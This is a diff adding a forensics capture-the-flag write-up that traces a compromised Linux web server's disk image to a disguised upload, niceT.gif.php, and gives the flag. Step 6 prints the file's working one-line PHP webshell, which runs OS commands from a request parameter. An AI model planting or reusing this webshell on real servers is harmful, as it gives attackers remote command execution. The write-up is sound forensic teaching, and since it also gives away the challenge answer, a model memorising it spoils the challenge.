@@ -1,0 +1,84 @@
+===============================================================================
+BUETCTF - Phantom Intrusion Writeup
+Category: Forensics
+Points: 300
+===============================================================================
+
+CHALLENGE DESCRIPTION:
+----------------------
+A Linux web server VM was compromised. We are given a VM image and asked to find
+"the file used to gain initial access" plus its MD5 hash.
+Flag format: buetctf{filename.ext_md5Hash}
+
+FILES PROVIDED:
+--------------
+- Server_13.1.5.zip
+  (contains a VirtualBox VM with a VDI disk)
+
+SOLUTION:
+---------
+
+1. UNPACK THE VM
+   The zip contains a VirtualBox VM. After extracting, we have:
+   - Server13_clean.vdi (the disk image)
+   - a small snapshot VDI (unused)
+   The VDI is the main disk we need to analyze.
+
+2. CONVERT VDI TO RAW (so we can use forensic tools)
+   The environment has Sleuth Kit tools (mmls, fls, icat) but not VBox tools.
+   So we parsed the VDI header and rebuilt a raw disk image by reading the
+   Block Allocation Table (BAT). This produces a sparse raw file that tools
+   like mmls/fls can read.
+
+3. IDENTIFY PARTITIONS
+   Use mmls on the raw disk:
+   - GPT partition table
+   - Main Linux partition starts at sector 4096
+   This gives us the filesystem offset for Sleuth Kit.
+
+4. BROWSE THE FILESYSTEM
+   Use fls with the partition offset (4096) to list directories.
+   We quickly see /var and /var/www which usually holds web content.
+
+5. CHECK WEB ROOT & UPLOADS
+   Listing /var/www/html shows:
+   - index.php, dashboard.php, upload.php
+   - fileuploads/receipts directory with many image files
+
+   Inside the receipts folder, one file stands out:
+   - niceT.gif.php
+
+   A file with double extension in an uploads folder is a classic webshell
+   pattern (image disguise + PHP).
+
+6. CONFIRM CONTENT
+   Using icat to extract the file shows:
+   GIF89a; 
+   <?php system($_REQUEST["c"]); ?>
+
+   This is clearly a webshell: it runs arbitrary OS commands from a request
+   parameter. This matches “file used to gain initial access”.
+
+7. CALCULATE MD5
+   Hash the extracted file:
+   - MD5 = 119505fea6a3173200b5b0630f7f746c
+
+8. OPTIONAL LOG CONFIRMATION
+   Apache logs show POSTs to /upload.php, consistent with the attacker
+   uploading a payload first. This aligns with the webshell being the initial
+   access file.
+
+FLAG:
+-----
+buetctf{niceT.gif.php_119505fea6a3173200b5b0630f7f746c}
+
+TOOLS USED:
+-----------
+- 7z (extract VM)
+- Sleuth Kit: mmls, fls, icat
+- md5sum
+
+NOTES:
+------
+This solution focuses on the initial access file. The webshell filename and
+MD5 are sufficient for the required flag.
